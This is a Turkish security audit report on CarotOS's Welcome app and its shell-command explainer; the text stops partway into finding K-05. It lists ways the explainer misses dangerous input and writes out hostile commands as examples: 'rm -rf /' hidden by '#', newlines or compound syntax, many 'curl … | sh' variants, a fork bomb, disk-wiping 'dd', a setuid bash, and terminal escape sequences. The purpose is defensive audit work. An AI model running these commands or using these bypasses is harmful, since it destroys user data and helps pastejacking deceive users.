# Karşılama ve Komut Açıklayıcı denetimi (karsilama-acikla)

Tarih: 13 Kasım 2026. Dal: 1.4. Salt okunur denetim; depoda hiçbir dosya değiştirilmedi.
Önekler: **K** = Karşılama, **A** = Komut Açıklayıcı.

Kanıt türleri: **Denendi** = WSL Debian (Python 3.13, xvfb) üzerinde çalıştırıp gördüm; **Okundu** = koddan çıkardım. Tehlikeli komut örneklerinin hiçbiri çalıştırılmadı; yalnızca `acikla_motor`a METİN olarak verildi. "Hiçbir parça çalışmıyor" sınaması için gerçek etkileşimli bash'te (pty) zararsız `touch <kanarya>` komutları kullanıldı.

## 1. Kapsam

**Satır satır okunanlar**
- `opt/carotos/acikla/acikla_motor.py` (428 satır), `veri_tehlike.py` (102), `veri_guvenlik.py` (164), `veri_temel.py` (332)
- `usr/local/bin/carotos-acikla`, `usr/share/carotos/acikla.bash`, `hooks/live/9999-carotos-setup.hook.chroot` içindeki Alt+E bağlantısı (satır 49-58)
- `welcome/gezinme.py` (tamamı)
- `welcome/carotos-welcome.py`: 1-60, 160-260, 795-870, 1055-1170 ve 1170-2785 (kod bölümünün tamamı: ayar dosyaları, tema/duvar kâğıdı/oturum dili uygulama, pencere, dil hazırlığı iletişim kutusu, MAC anahtarı, Bitir akışı)
- `etc/skel/.config/autostart/carotos-welcome-autostart.desktop`, `usr/share/applications/carotos-welcome.desktop`
- Karşılama'nın root olarak çalıştırdığı iki yardımcı (kapsam kenarı, ama "yetki isteyen adım" olduğu için tam okundu): `usr/local/sbin/carotos-dil-hazirla`, `usr/local/sbin/carotos-mac-ayar`, `opt/carotos/ortak/sistem_dili.py`
- `opt/carotos/ortak/dil.py` (1-200), `ortak/tema.py` (`uygula`/`palet` girişi)
- `usr/local/bin/carotos-oturum-acilis` (açılış perdesi; güvenlik açısından yalnızca göz gezdirildi, sorun yok)

**Hedefli taranan**
- `veri_saldiri.py`: nmap (T deseni dahil), tcpdump, tshark, aircrack-ng, nikto (-Tuning), sqlmap, john, hydra, nc bayrak açıklamaları gerçeğe karşı kontrol edildi (yaklaşık 130 bayrak). nmap/tcpdump/tshark/aircrack/sqlmap/john "nasıl/savunma" paragrafları ve satır 125-255 arası ayrıntı metinleri satır satır okunmadı.
- `carotos-welcome.py` 60-1100 (sayfa metinleri): yalnızca komut kutuları (`("code", …)`), `action` düğmeleri, gizlilik sayfasının iddiaları (DHCP ad yayını, IPv6 geçici adres, zram, apt.carotos.org; hepsi `etc/NetworkManager`, `sysctl.d`, `zram-generator.conf.d`, hook ile uyumlu bulundu) ve Komut Açıklayıcı sayfası okundu.
- `security-panel/carotos-security-panel.py` yalnızca Açıklayıcı'yı çağıran bölüm (655-665): çıktı düz `TextBuffer.set_text` ile gösteriliyor, işaretleme sorunu yok.

**Okunmayanlar**
- `tests/*` içeriği ayrıntılı okunmadı; çalıştırıldı: `test_acikla` 41/41 geçti; `test_karsilama_ag/akis/gezinme/gorseller` geçti; `test_karsilama_yeni_sayfalar` 1 test düştü, nedeni benim geçici kopyaya `tools/` klasörünü almamış olmam (denetim düzeneğinden kaynaklı, depo hatası değil).
- Sayfa metinlerinin büyük bölümü, 7 dil JSON'u, `former/konular/acikla.py` (Former animasyonu).
- Gerçek GTK/pkexec/polkit etkileşimi: pkexec, apt, xfconf, AccountsService bu ortamda yok; ilgili bulgular koddan çıkarıldı (Okundu).

## 2. Tehdit modeli

**Komut Açıklayıcı.** Yüzey: kullanıcının terminalde yazdığı ya da **yapıştırdığı** satır (`READLINE_LINE`), `carotos-acikla` argüman/stdin'i, Güvenlik Paneli'nin kurduğu komut. Aktörler ve beklenen saldırı: (1) kötü niyetli web sayfası/belge/sohbet: kullanıcının yapıştıracağı metni hazırlar ("pastejacking": görünen kısım zararsız, gizli kısım zararlı; satır sonu, `#`, kaçış dizisi, benzer karakter). Araç tam bu anı korumak için var: kullanıcı yapıştırır, Enter'a basmadan Alt+E'ye basar. (2) Hazır "tek satırda kur" rehberleri (`curl … | sh`). Güven sınırı: **metin → ayrıştırıcı → ekrana yazılan açıklama**. İki söz verilir: "çalıştırılmaz" (bu söz TUTULUYOR) ve "tehlikeli kalıplar uyarılır / her parça açıklanır" (bu söz birçok yerde TUTULMUYOR; yanlış güven burada doğar).

**Karşılama.** Yüzey: kullanıcının kendi ayar dosyaları (`~/.config/carotos-welcome/settings.json` ve 10 kardeş uygulamanın ayar dosyası, `~/.xsessionrc`, `~/.dmrc`), pkexec ile root'a giden iki yardımcı, GTK ana iş parçacığı. Ağdan gelen metin gösterilmiyor (SSID vb. yok). Aktör: esas olarak "kendi kendine zarar" (bozuk dosya, yarıda kesme, ağsız ortam) ve aynı makinedeki başka yerel kullanıcı (root yardımcılarına giden argümanlar). Güven sınırı: kullanıcı → pkexec → root betiği; betik argümanı sabit tabloyla doğruluyor (sağlam, bkz. bölüm 5).

## 3. Bulgular

Özet: Yüksek 4 (A-01…A-04), Orta 5 (A-05, A-06, A-07, K-01, K-02), Düşük 8 (A-08…A-10, K-03…K-07). Aynı kök neden tek bulguda toplandı.

### Yüksek

#### A-01: Sözcük ortasındaki `#` yorum sayılıyor; satırın geri kalanı açıklamadan ve tehlike taramasından düşüyor
- **Konum:** `acikla_motor.py:98` (`lex.commenters = "#"`), kullanıldığı yer `:96-99`
- **Senaryo:** bash'te `#` yalnızca sözcük başında yorum başlatır; `shlex` ise sözcüğün ortasında da başlatıyor. `echo a#b; rm -rf /` satırında bash `rm -rf /` komutunu çalıştırır; açıklayıcı yalnızca `echo`yu gösterir, `rm_tehlikeli` uyarısı çıkmaz. Aynı şekilde `ls x#y && rm -rf ~`, `echo $#; rm -rf /`, `echo ok # yorum` + yeni satır + `rm -rf /`. Meşru kullanım da etkilenir: `curl http://x/p#frag; …`.
- **Kanıt:** Denendi (`ayristir("echo a#b; rm -rf /")` → parçalar `['echo']`, tehlike `[]`).
- **Düzeltme:** `commenters = ""` yapıp `#`'i yalnızca sözcük başında (öncesi boşluk/satır başı/kontrol işlemi) yorum say. Yorumdan sonra satır sonu varsa ayrıştırmaya devam et. Yorum kısmını "yorum: çalışmaz" diye göster.
- **Görünür davranış değişikliği:** Evet (daha önce sessiz olan satırlar artık uyarı verecek).

#### A-02: Yeni satır (ve `\r`) komut ayırıcı sayılmıyor; sonraki satırdaki komutlar öncekinin argümanına dönüşüyor
- **Konum:** `acikla_motor.py:37` (`KONTROL_ISLEMLERI` içinde `\n` yok), `:96-99` (`whitespace_split` yeni satırı boşluk sayar)
- **Senaryo:** Çok satırlı yapıştırmada (bash bracketed paste yeni satırı satır tamponuna koyar, Enter'da hepsi sırayla çalışır) `ls` + yeni satır + `rm -rf /` satırı tek `ls` komutu olarak görünür: parça listesi yalnızca `ls`, `rm` "argüman" olarak yazılır, uyarı yok. Klasik pastejacking tam olarak budur. Gerçek bash'te (pty) doğrulandı: yeni satırlı kanarya satırında ikinci satırın komutu ayrı komut olarak değil, "Parça 4" argümanlarının içinde gösterildi. `echo temiz\rrm -rf /` de aynı şekilde yutuluyor.
- **Kanıt:** Denendi (motor + gerçek etkileşimli bash'te Alt+E).
- **Düzeltme:** Satır sonunu `;` gibi kontrol işlemi yap (tırnak/ters bölü dışında). `\r` ve `\v`/`\f`'yi ayrıca işaretle (bkz. A-05). Çok satırlı girdide başa "Satır birden fazla komut içeriyor (N satır)" notu.
- **Görünür davranış değişikliği:** Evet.

#### A-03: Bileşik komutlar, anahtar sözcükler ve "başka komut çalıştıran" sarmalayıcılar çözümlenmiyor; içlerindeki tehlikeli komut sessizce "zararsız/tanımıyorum" görünüyor
- **Konum:** `acikla_motor.py:133-179` (`onek_ayikla`), `:304-324` (`tehlikeleri_bul` yalnızca parça başına, yalnızca `komut` adına bakıyor), `veri_temel.py:312-320` (`sh -c` yalnızca "sonraki argümanı komut olarak çalıştırır" diyor, içeriği çözümlemiyor)
- **Senaryo (hepsi `rm -rf /` içerir, hiçbirinde uyarı çıkmadı):** `for i in 1; do rm -rf /; done`, `if true; then rm -rf /; fi`, `while :; do …; done`, `! rm -rf /`, `{ rm -rf /; }`, `true && { rm -rf /; }`, `case x in x) rm -rf / ;; esac` (program adı `do`, `then`, `{`, `!` sanılıyor); `bash -c 'rm -rf /'`, `sudo sh -c 'rm -rf /'`, `su -c '…'`, `ssh h '…'`, `xargs rm -rf`, `watch rm -rf /`, `find / -exec rm -rf {} \;`, `eval '…'`. Önek ayıklama hataları: `sudo --user root rm -rf /` (uzun seçeneğin değeri program sanılıyor, `_SUDO_DEGER_ALAN` yalnızca kısa seçenekler: `:130`), `env -u FOO rm -rf /` (`:154-158`), `timeout -s KILL 10 rm -rf /` (`:169-175`, sinyal "süre" sanılıyor, program `10` oluyor), `ionice`, `busybox`, `nice` dışı sarmalayıcılar. `sudo -s`/`sudo -i` parça adı boş (`?`) çıkıyor.
- **Kanıt:** Denendi (yaklaşık 25 satır).
- **Düzeltme:** (1) Ayrıştırıcıya bash ayrılmış sözcüklerini (`if then elif else fi for while until do done case esac in { } ! time coproc select function`) önek olarak atlat; `(`/`)`/`{`/`}` grup işaretlerini yut. (2) `sh/bash/dash/zsh -c ARG`, `eval ARG`, `su -c ARG`, `ssh HOST ARG`, `xargs CMD…`, `find … -exec CMD … ;|+`, `watch`, `timeout`, `env`, `nice`, `ionice`, `setsid`, `nohup`, `stdbuf`, `busybox`, `flock`, `chroot` için iç komutu (sınırlı derinlik, örn. 3) özyinelemeli çözümle ve tehlike kurallarını ona da uygula. (3) Güvenli taraf yedeği: ayrıştırıcı yapıyı anlayamadıysa (bilinmeyen anahtar sözcük, çözülemeyen sarmalayıcı) sessiz kalma; "bu satırın yapısını tam çözemedim, tehlikeli parçalar kaçmış olabilir" uyarısı bas ve tehlike kurallarını TÜM belirteç dizisi üzerinde yapıdan bağımsız ikinci geçişle de çalıştır (birleşim). (4) `sudo`/`env`/`timeout` seçenek tablosunu uzun seçenekleri ve değer alanları kapsayacak biçimde tamamla.
- **Görünür davranış değişikliği:** Evet (daha çok uyarı).

#### A-04: `curl … | sh` ailesinin birçok yaygın biçimi uyarı almıyor
- **Konum:** `veri_tehlike.py:15-26` (iki satır kuralı, ham satırda regex)
- **Senaryo (Denendi; ⚠ "Tehlikeli kalıp" satırı ÇIKMADI):**
  `curl -fsSL URL | /bin/sh` ve `| /usr/bin/env bash` / `| env bash` (regex `([a-z]*sh)` yol/`env` kabul etmiyor);
  `curl 'https://x/i.sh?a=1&b=2' | sh` ve `…;b=2…` (regex `[^|;&]*` URL'deki `&` ya da `;` yüzünden duruyor; gerçek kurulum adreslerinde sık);
  `curl … | sudo -u root sh` (`-u root` iki sözcük);
  `bash <(curl …)`, `sh <(wget -qO- …)`, `source <(curl …)`, `. <(curl …)`;
  `eval "$(curl …)"` ve `eval $(curl …)`; `sh -c \`curl …\``;
  `echo … | base64 -d | sh`, `curl … | base64 -d | sh`, `… | gunzip | sh`, `… | tee x | sh`;
  `curl … | python3` / `perl`; `curl … |& sh`; `curl … | (sh)`; `curl … | { sh; }`;
  `curl -o a URL && bash a`.
  Yanlış alarm: `curl … | ssh host` ve `| fish` (`[a-z]*sh` ile eşleşiyor; `ssh` yanlış alarm, `fish` doğru).
  Kısmi sinyal: boru sonunda `sh` varsa `sh` parçasına genel "internetten gelen betiği doğrudan sh'e verme" uyarısı çıkıyor, ama bu uyarı `sh script.sh` için de çıkıyor, yani ayırt edici değil.
- **Kanıt:** Denendi.
- **Düzeltme:** Regex yerine belirteç tabanlı kural: boru hattındaki herhangi bir aşama (önek ayıklandıktan sonra, `basename`, `sh/bash/dash/zsh/ksh/fish/python*/perl/ruby/node/source/.`) ve ondan YUKARI akışta herhangi bir aşama `curl/wget/fetch/nc/base64 -d/gunzip/…` ise yüksek uyarı. `<(…)` ve `$(…)`/ters tırnak içinde `curl|wget` görülüp dışta `sh/bash/source/./eval` varsa yüksek uyarı. `[^|;&]*` kullanma (bkz. A-09: ikinci dereceden süre).
- **Görünür davranış değişikliği:** Evet.

### Orta

#### A-05: Komut satırındaki ANSI kaçış dizileri ve denetim karakterleri çıktıya aynen yansıyor
- **Konum:** `acikla_motor.py:378` (komut adı + argümanlar), `:387`, `:392`, `:394`, `:396`, `:405`, `:415`; `carotos-acikla:56`
- **Senaryo:** Satırda `ESC` (0x1b), `BEL`, NUL, `U+202E` (sağdan sola geçersiz kılma) vb. varsa açıklama bunları ham yazar. Tırnak içinde `;` korunduğundan `'\x1b]0;…\a'` (terminal başlığı) ve `'\x1b]52;c;BASE64\a'` (panoyu yazma) dizileri bozulmadan geçer; `\x1b[2J\x1b[H` ekranı silip sahte "zararsız" açıklama çizdirebilir; `\x1b[8m` gizli metin; `\u202e` ile `rm -rf /` görsel olarak tersine çevrilebilir. Açıklayıcı, güvenmek için bakılan yerdir; kendi çıktısı da saldırı yüzeyi olmamalı. (Pano/başlık etkisi terminal emülatörüne bağlıdır; ham baytların çıktıya aynen girdiği Denendi. ESC baytının bash yapıştırmasından READLINE_LINE'a nasıl girdiği denenmedi, bkz. Şüpheliler.)
- **Kanıt:** Denendi (`acikla()` çıktısında `\x1b[2J`, `\x1b]0`, `\x1b[8m`, `\u202e`, `\x00` ham duruyor).
- **Düzeltme:** `metin_olustur` çıkışında tek noktadan temizle: C0 (`\n` ve `\t` hariç), DEL, C1 (0x80-0x9f), `U+200B-200F`, `U+202A-202E`, `U+2066-2069`, `U+FEFF` karakterlerini görünür biçimde değiştir (`^[`, `\x1b`, `\u202e`) ve satıra "Satırda görünmeyen/denetim karakteri var, dikkat" uyarısı ekle. Bu çıkış Güvenlik Paneli'nde de kullanıldığı için ortak kazanç.
- **Görünür davranış değişikliği:** Yalnızca hostile girdide (olağan komutlarda değişmez).

#### A-06: Yol ile verilen ya da uzantılı program adı sistem komutu sanılıyor; yol ekranda gizleniyor
- **Konum:** `acikla_motor.py:143` ve `:179` (`os.path.basename`), `:182-190` (`_tanim_bul`: `ls.sh` → `ls`)
- **Senaryo:** `./ls -la` ve `/tmp/.gizli/ls` "Bir klasörün içindeki dosyaları listeler" diye açıklanıyor ve başlık yalnızca `ls -la` gösteriyor (yol silinmiş). `./cat.py /etc/passwd` → "Dosyaların içeriğini yazar". `./nmap.sh 10.0.0.0/8` → nmap açıklaması. `./sudo ls` → "sudo ls … sudo ile root olarak çalışır" (önek ayıklamada `./sudo` gerçek sudo sayılıyor: `:143-144`). Kullanıcı o dosyanın yerel bir program olduğunu göremiyor.
- **Kanıt:** Denendi.
- **Düzeltme:** Belirteçte `/` varsa ya da çıplak ad değilse veri tabanına bakma; "Bu bir dosya yolu (`./ls`): sistem komutu olmayabilir, çalıştırdığı şeyi bilmiyorum" de ve tam belirteci göster. `_tanim_bul`'daki `split(".")[0]` kuralını yalnızca `mkfs.*` ve `python3.N` gibi bilinen biçimlere kısıtla (`ls.sh`, `cat.py` eşleşmesin).
- **Görünür davranış değişikliği:** Evet (yerel yol verilen komutlarda).

#### A-07: Tehlikeli kalıp kuralları dar; aynı zararı veren yaygın biçimler sessiz
- **Konum:** `veri_tehlike.py:34-42` (`_rm_tehlikeli`), `:45-50` (`_dd_diske`), `:57-63` (`_chmod_genis`), `PARCA_KURALLARI` `:83-102`; yönlendirme için kural yok
- **Senaryo (Denendi, uyarı YOK):**
  `rm -rf` ile `/usr/`, `/var/` (sondaki `/`), `//`, `/./`, `/root`, `/opt`, `/dev`, `~/.*`, `$HOME/.*`, `.`, `..`, `./*`, `${HOME}`, `$HOME/..`; hedef listesi sabit küme eşleşmesi.
  `find / -delete`, `find ~ -type f -delete`, `find / -exec rm -rf {} \;`: `-delete` bayrağı açıklanıyor ama ⚠ yok.
  `dd … of=/dev/disk/by-id/…`, `/dev/mapper/…`, `/dev/md0`, `/dev/dm-0`, `/dev/loop0`, `/dev/mem`; `of=$DISK` (değişken); `… | tee /dev/sda`.
  `cat /dev/zero > /dev/sda`, `echo x > /dev/sda`, `>| /dev/sda`: yönlendirmeye kural yok (`> ~/.bashrc`, `> /etc/passwd` dahil).
  `shred`, `wipefs`, `fdisk`, `parted`, `sgdisk --zap-all` veri tabanında yok ("tanımıyorum") ve uyarı da yok.
  `chmod -R 0777 /`, `chmod -R a+rwx /`, `ugo+rwx`, `o+rwx` (mod listesi `("777","666","a+w","o+w","ugo+w","a=rwx")`); `chmod 777 /etc/shadow`, `/etc/passwd` (kök listesi dar: yalnızca `/`, `/etc` gibi dizinler); `chmod u+s /bin/bash`, `4755`, `+s` (kalıcı root kabuğu).
  Çatal bombası `:(){ :|:& };:` ve türevleri; `mv / …`; `iptables -F`, `setenforce 0` ("tanımıyorum", uyarısız).
  Doğru yakalananlar: `rm -rf /`, `/*`, `~`, `$HOME`, `/etc`, `--no-preserve-root`, `-fr`, `-Rf`, `--recursive --force`, `sudo`, `/bin/rm`, `\rm`, `command/env/nice/timeout rm`; `dd of=/dev/sd?|nvme|vd?|hd?`; `mkfs*`; `chown -R … /`; `ufw disable|reset`, `systemctl stop|disable|mask ufw|fail2ban|apparmor|clamav-daemon|carotpot`.
- **Kanıt:** Denendi (yaklaşık 90 satır).
- **Düzeltme:** `rm`: hedefleri normalleştir (`os.path.normpath`, sondaki `/`, `$HOME`/`${HOME}`/`~` varyantları, `~/.*`, `.`/`..`/`./*`), "kök, ev, sistem dizini ya da onların doğrudan altı" için kural. `find`: `-delete` ya da `-exec rm|shred|dd|mkfs…` varken başlangıç yolu `/`, `~`, `.` ise uyar. `dd`/yönlendirme: `/dev/` altında `zero|null|stdin|stdout|stderr|tty|fd|shm|pts|full|random|urandom` dışı her hedefe (özellikle `by-id`, `mapper`, `md`, `dm-`, `loop`, `mem`, `kmem`, `port`) yazmayı uyar; yönlendirme hedefi `/etc/*`, `/boot/*`, `~/.bashrc|.ssh/*`, `/dev/sd*` ise `yonlendirme_tehlikeli` kuralı. `chmod`: izin dizgisini sembolik/sekizlik olarak çöz (herkese yazma/çalıştırma biti, setuid/setgid biti) ve kök listesine `/etc/shadow`, `/etc/passwd`, `/etc/sudoers*`, `/bin/*`, `/usr/bin/*`, `~/.ssh` ekle. Çatal bombası için `:\(\)\s*\{` deseni. `shred`, `wipefs`, `fdisk`, `parted`, `sgdisk`, `iptables`, `nft`, `setenforce`'ı veri tabanına ve kurala ekle.
- **Görünür davranış değişikliği:** Evet (yeni uyarılar).

#### K-01: Dil hazırlığında "İptal" `surec.terminate()` ile root sürecini öldürmeye çalışıyor; `PermissionError` iletişim kutusunu açık bırakıyor ve apt arka planda sürüyor
- **Konum:** `carotos-welcome.py:2612-2615` (`surec.terminate()`), çağıran zincir `:2564-2576`, `:2552-2558`, `:2536-2541`
- **Senaryo:** Kullanıcı tr/en dışı bir dil seçip Bitir der, "Hazırla"ya basar, parolayı girer, `apt-get install` sürerken İptal'e basar. `pkexec` hedef programı `exec` ettiğinden `Popen` süreci artık gerçek kimliği root olan betiktir; normal kullanıcı ona sinyal gönderemez, `terminate()` `PermissionError: Operation not permitted` fırlatır. İstisna `_run_language_setup`'tan taşar: `dlg.destroy()` (`:2615`) çalışmaz, kalıcı (modal) iletişim kutusu ekranda kalır (yanıt döngüsü artık yok), Karşılama penceresi tıklanamaz hâle gelir ve `on_next` istisnayla biter (`self.close()` çağrılmaz). Root `apt-get` yine de bitene kadar çalışır (kullanıcı iptal edildi sanır) ve dpkg kilidini tutar (Mağaza/güncelleme bu sırada başarısız olur). Aynı iletişim kutusu "Hazırlanıyor… pencereyi kapatmayın." diyor ve yine de İptal düğmesi sunuyor.
- **Kanıt:** Okundu. Kod yolu ve pkexec'in hedefi `setreuid` ile root yapıp `execv` ettiği bilinen davranış; gerçek pkexec bu ortamda yok, denenmedi. Sonuç yüksek güvenle çıkarım, ama VM'de doğrulanmalı (bkz. plan).
- **Düzeltme:** `terminate()`'i `try/except OSError` içine al ve `finally: dlg.destroy()` kullan. Root sürecini iptal edilebilir yapmak için ya betiğe stdin'den "iptal" kanalı (kullanıcı tarafı kapatınca betiğin kendini temiz sonlandırması: apt başlamadan önce kontrol) ya da apt başladıktan sonra İptal'i devre dışı bırakıp "Bitene kadar bekle" de. `SIGPIPE` ile apt/dpkg'nin yarıda ölmemesi için betik `signal.signal(SIGPIPE, SIG_IGN)` ve `bildir`'de `BrokenPipeError` yakalama (bkz. Şüpheliler).
- **Görünür davranış değişikliği:** İptal davranışı ve metni (iptal sırasında apt çalışıyorsa "bitene kadar beklenir" ya da güvenli iptal).

#### K-02: Hazırlık reddedilse ya da başarısız olsa bile oturum dili yazılıyor (yazı tipsiz ja/zh masaüstü); belge ve iletişim kutusu metniyle çelişiyor
- **Konum:** `carotos-welcome.py:2552-2558` (`self.prepare_language()` dönüş değeri kullanılmıyor), `:2560-2563` (docstring: "Reddedilirse/başarısız olursa oturum dili değişmez"), `:1553-1573` (`apply_session_language` yalnızca locale'in üretilmiş olmasına bakıyor), `UI["dh_soru_alt"]` ("Hayır derseniz … masaüstü şimdiki dilde kalır")
- **Senaryo:** (a) Ağ yok: `carotos-dil-hazirla` locale'i üretir (çevrimdışı çalışır, `locale-gen` başarılı), sonra `apt-get install` başarısız olur (çıkış kodu 1). `prepare_language` False döner ama sonuç atılır; `apply_session_language("ja")` locale var diye `~/.xsessionrc`, `~/.dmrc` ve AccountsService'e `ja_JP.UTF-8` yazar. Sonraki girişte masaüstü yazı tipi paketi (`fonts-noto-cjk`, fcitx5) olmadan Japonca/Çince açılır: tofu kutuları. Kod yorumu (`:1566-1567`) tam bu durumu engellemek için yazılmış. (b) Kullanıcı "Şimdi değil" der, ama locale daha önce üretilmişse (ikinci çalıştırma, ya da yarım kalan önceki hazırlık) oturum dili yine yazılır.
- **Kanıt:** Denendi (`prepare_language` False döndürülüp locale "var" yapıldığında `apply_choices` `~/.xsessionrc yazıldı: ja_JP.UTF-8` ve `.dmrc`, `accountsservice`'i çağırdı; bkz. bölüm 6, düzenek).
- **Düzeltme:** `ok = self.prepare_language()`; yalnızca `ok` ve `not sd.hazirlik_gerekli_mi(lang)` iken `apply_session_language` çağır. Kısmi başarıda (locale var, paket eksik) kullanıcıya açıkça bildir ve dili değiştirme.
- **Görünür davranış değişikliği:** Evet, ama belgelenmiş niyete uygun hâle gelir.

### Düşük

#### A-08: Yönlendirme ve açıklama gösterimi yanlış ya da eksik
- **Konum:** `acikla_motor.py:113-116` (yönlendirme ayrıştırma), `:379-382` (tanınmayan komutta `continue`; yönlendirme `:403-405`'e hiç gelmiyor), `:117-123` (`(` `)` atılıyor), `:404-405` (`<`/`>` metni)
- **Senaryo:** `ls > /dev/null 2>&1` → "ls 2" (`2` argüman olarak yazılıyor) ve `>& 1: çıktıyı şu dosyaya yazar (varsa üzerine yazar)` (`1` dosya adı sanılıyor; çok yaygın bir kalıp için yanlış cümle). `echo hi >&2` aynı yanlışı yapıyor. `cat <<< merhaba` → "girdiyi şu dosyadan okur: <<< merhaba". Tanınmayan komutta (`bilinmeyenkomut > /etc/passwd`) yönlendirme hiç gösterilmiyor. `echo $(id)` ekranda `echo $ id` olarak görünüyor (`(` `)` silinmiş), `komut_yerine` notu çıkıyor ama gösterilen argüman yazılandan farklı.
- **Kanıt:** Denendi.
- **Düzeltme:** `N>&M`/`>&M` fd kopyalamayı ayrı tanı ("hata çıktısını normal çıktıya yönlendirir"), `<<<`/`<<` için "here-string/here-document", yönlendirmeyi tanınmayan komutta da yaz, `$(`…`)` içeren belirteçleri olduğu gibi göster (shlex yerine ham dilimlerden).
- **Görünür davranış değişikliği:** Evet (metin düzeltmeleri).

#### A-09: Geçersiz UTF-8 ile çökme; çok uzun satırda süre/çıktı sınırı yok
- **Konum:** `carotos-acikla:52` ve `:56` (`sys.stdin.read()`, `sys.stdout.write`); `veri_tehlike.py:17` (`[^|;&]*` ile ikinci dereceden regex)
- **Senaryo:** Bash'e Latin-1 gibi UTF-8 olmayan bayt girilip Alt+E'ye basılırsa (`--satir` argümanı `surrogateescape` ile çözülür) `sys.stdout.write` `UnicodeEncodeError: surrogates not allowed` izi basar; stdin yolunda `UnicodeDecodeError`. Bu hatada açıklama hiç görünmez (güvenli taraf değil: çıktı yok). Süre: `curl ` sözcüğünün 100 000 kez tekrarı (500 KB) 60,5 s sürdü (20 000 tekrarda 2,4 s; ikinci dereceden). 50 000 parçalı satır 7,9 MB çıktı üretti, sınır yok. Diğer girdiler (1 MB düz satır 0,46 s, 20 000 derin `$(`, 100 000 tırnak, boş/yalnız işaret satırları, kapanmayan tırnak, sonda `\`) çökmedi ve takılmadı.
- **Kanıt:** Denendi.
- **Düzeltme:** `sys.stdout.reconfigure(errors="backslashreplace")`, stdin'i `errors="replace"` ile oku. Girdiyi üst sınırla (örn. 64 KB; aşıldığında "satır çok uzun, ilk 64 KB açıklandı" notu) ve parça/çıktı sayısına sınır koy. Regex yerine belirteç kuralı (A-04) ikinci dereceden süreyi de giderir.
- **Görünür davranış değişikliği:** Yalnızca uç girdilerde.

#### A-10: Veri tabanında gerçeğe aykırı ya da yanlış yönlendiren birkaç ifade
- **Konum:** `veri_guvenlik.py:119` (`ss -p` `root=True`), `acikla_motor.py:289-291`; `veri_temel.py:312-320` (`sh` uyarısı); `carotos-acikla:47-50`
- **Senaryo:** `ss -p` çıktıya "Yetki: root yetkisi gerekir (sudo ile çalıştır)" yazdırıyor; bayrağın kendi metni "başkasının süreci için root gerekir" diyor (kendi süreçleri için root gerekmez). `sh/bash` uyarısı ("internetten gelen betiği doğrudan sh'e verme") `bash script.sh` için de çıkıyor, bu yüzden `curl | sh` ayırt edici sinyali değil (A-04). `carotos-acikla echo 'a; rm -rf /'` argüman yoluyla çağrılınca tırnaklar kayboluyor (`" ".join`), `a;` ve `rm -rf /` ayrı parça görünüyor (aşırı uyarı, ama yanlış). `-h`, `--help`, `--dil` yalnızca ilk argüman olduğunda seçenek; `--satir` sonrası her şey metin (Alt+E yolunda tırnaklama güvenli, denendi).
- **Kanıt:** Denendi (ss, argv); Okundu (sh uyarısı).
- **Düzeltme:** `ss -p` için `root=True`'yu kaldır, nüansı metinde bırak. `argv` yolunda tek argüman boşluk içeriyorsa onu tam satır say, çok argümanda `shlex.join` kullan. `sh` uyarısını "uzaktan alınmış betik" bağlamına bağla (A-04'teki kural).
- **Görünür davranış değişikliği:** Küçük.

#### K-03: Bitir düğmesi GTK ana iş parçacığında bloklayan alt süreç ve D-Bus çağrıları yapıyor
- **Konum:** `carotos-welcome.py:2552-2558` (`apply_choices`), `:1358-1369` (`xfconf`, her çağrıda `timeout=8`), `:1291-1320` (`apply_wallpaper`: liste + her `last-image` için 2 çağrı + `xfdesktop --reload`, her biri 8 s), `:1385-1407` (tema: 4-5 `xfconf-query`), `:1529-1550` (AccountsService: 2 eşzamanlı D-Bus çağrısı, 5 s'er), `:2564` + `sistem_dili.py:77-91` (`dpkg-query` 30 s, `locale -a` 15 s; yalnızca tr/en dışı dillerde)
- **Senaryo:** Normalde milisaniye; `xfconfd`/`accounts-daemon` takılırsa ya da yavaş diskte pencere onlarca saniye "yanıt vermiyor" olur (en kötü durumda yaklaşık 1 dakikayı aşar), kullanıcı kapatmaya çalışır ve ayarlar yarım uygulanır. `xfconf()` dönüş kodunu denetlemiyor, başarısız komut için de `True` döner (`:1363-1368`).
- **Kanıt:** Okundu.
- **Düzeltme:** `apply_choices`'ı iş parçacığına al (ilerleme göstergesiyle), sonucu `GLib.idle_add` ile döndür; `xfconf` dönüş kodunu denetle; zaman aşımlarını kısalt.
- **Görünür davranış değişikliği:** Küçük (Bitir sırasında ilerleme).

#### K-04: Bitir zinciri tek bir istisnada kopuyor; `~/.xsessionrc`/`~/.dmrc` UTF-8 değilse sihirbaz kapanmıyor
- **Konum:** `carotos-welcome.py:1483-1487` ve `:1510-1516` (yalnızca `except OSError`), `:2536-2541` (`apply_choices` sonra `close()`), `:1553-1573`
- **Senaryo:** Kullanıcının `~/.xsessionrc` ya da `~/.dmrc` dosyasında UTF-8 olmayan bir bayt varsa `UnicodeDecodeError` (ValueError alt sınıfı) yakalanmaz; `apply_session_language` ve `apply_choices` istisnayla biter, `apply_wallpaper` hiç çalışmaz, `self.close()` çağrılmaz; Bitir'e her basışta aynı hata, pencere açık kalır. Ayrıca ters sıralı işaretçi (`<<<` `>>>` sırası bozuk) dosyayı çoğaltarak yazar.
- **Kanıt:** Denendi (Latin-1 `.xsessionrc` ve `.dmrc`: `UnicodeDecodeError`; ters işaretçide içerik yinelendi).
- **Düzeltme:** Okuma `errors="replace"`/`surrogateescape` ya da `except (OSError, ValueError)`; `apply_choices`'ta her adımı ayrı `try/except` ile sar ve `close()`'u `finally`'de çağır; işaretçileri sıra ve sayıya göre doğrula; dosyaları geçici dosya + `os.replace` ile yaz.
- **Görünür davranış değişikliği:** Hayır (yalnızca hata durumunda).

#### K-05: Ayar dosyası değerleri doğrulanmıyor (açılışta çökme); yazmalar atomik değil; kardeş uygulama ayarları bozuk dosyada sıfırlanıyor
- **Konum:** `carotos-welcome.py:1194-1208` (`load_settings`: yalnızca `lang` ve `biten_konular` türü denetleniyor), `gezinme.py:74`, `carotos-welcome.py:1595` ve `:1966` (`wallpaper`), `:1211-1217` (`save_settings`), `:1410-1457` (`apply_sibling_settings`)
